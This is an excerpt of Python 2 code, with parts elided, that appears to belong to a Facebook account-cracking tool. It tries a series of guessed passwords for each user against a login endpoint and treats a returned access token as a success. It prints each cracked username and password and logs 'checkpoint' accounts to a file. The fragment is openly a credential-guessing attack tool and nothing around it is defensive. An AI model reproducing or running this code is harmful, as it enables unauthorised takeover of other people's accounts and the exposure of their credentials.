	...
	def main(arg):
		...
		try:
			...
			if 'access_token' in q:
				print '\x1b[1;92mSuccessful\x1b[1;97m--' + user + '--' + pass1
				oks.append(user+pass1)
			else:
				if 'www.facebook.com' in q["error_msg"]:
					print '\x1b[1;91mCheckpoint\x1b[1;97m--' + user + '--' + pass1
					...
					q = json.load(data)
					if 'access_token' in q:
						print '\x1b[1;92mSuccessful\x1b[1;97m--' + user + '--' + pass2
						oks.append(user+pass2)
					else:
						if 'www.facebook.com' in q["error_msg"]:
							print '\x1b[1;91mCheckpoint\x1b[1;97m--' + user + '--' + pass2
							cek = open("out/checkpoint.txt", "a")
							...
							q = json.load(data)
							if 'access_token' in q:
								print '\x1b[1;92mSuccessful\x1b[1;97m--' + user + '--' + pass3
								oks.append(user+pass3)
							else:
								if 'www.facebook.com' in q["error_msg"]:
									print '\x1b[1;91mCheckpoint\x1b[1;97m--' + user + '--' + pass3
									cek = open("out/checkpoint.txt", "a")
									...
									q = json.load(data)
									if 'access_token' in q:
										print '\x1b[1;92mSuccessful\x1b[1;97m--' + user + '--' + pass4
										oks.append(user+pass4)
									else:
										if 'www.facebook.com' in q["error_msg"]:
											print '\x1b[1;91mCheckpoint\x1b[1;97m--' + user + '--' + pass4
											cek = open("out/checkpoint.txt", "a")
											...
											q = json.load(data)
											if 'access_token' in q:
												print '\x1b[1;92mSuccessful\x1b[1;97m--' + user + '--' + pass5
												oks.append(user+pass5)
											else:
												if 'www.facebook.com' in q["error_msg"]:
													print '\x1b[1;91mCheckpoint\x1b[1;97m--' + user + '--' + pass5
													cek = open("out/checkpoint.txt", "a")
													...
													q = json.load(data)
													if 'access_token' in q:
														print '\x1b[1;92mSuccessful\x1b[1;97m--' + user + '--' + pass6
														oks.append(user+pass6)
													else:
														if 'www.facebook.com' in q["error_msg"]:
															print '\x1b[1;91mCheckpoint\x1b[1;97m--' + user + '--' + pass6
															cek = open("out/checkpoint.txt", "a")
															...
															q = json.load(data)
															if 'access_token' in q:
																print '\x1b[1;92mSuccessful\x1b[1;97m--' + user + '--' + pass7
																oks.append(user+pass7)
															else:
																if 'www.facebook.com' in q["error_msg"]:
																	print '\x1b[1;91mCheckpoint\x1b[1;97m--' + user + '--' + pass7
																	cek = open("out/checkpoint.txt", "a")
